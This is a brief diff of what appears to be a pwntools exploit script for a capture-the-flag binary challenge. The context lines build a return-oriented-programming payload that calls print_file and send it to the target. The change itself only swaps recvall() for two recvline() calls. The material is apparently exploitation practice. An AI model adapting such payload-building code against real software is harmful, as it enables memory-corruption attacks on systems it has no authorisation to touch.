@@ -119,4 +119,5 @@ payload += p64(data_section_addr)
 payload += p64(print_file_plt)
 
 p.sendafter(b"> ", payload)
-p.recvall()
+p.recvline()
+p.recvline()
